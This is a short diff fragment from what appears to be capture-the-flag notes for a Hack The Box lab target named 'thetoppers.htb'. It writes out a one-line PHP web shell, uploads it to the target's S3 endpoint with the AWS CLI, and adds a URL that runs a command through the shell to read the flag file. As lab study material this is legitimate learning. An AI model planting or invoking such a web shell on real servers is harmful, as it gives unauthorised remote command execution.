@@ -10,4 +10,5 @@ crunch 2 2 >words.txt
 cat /var/www/flag.txt
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
 ```
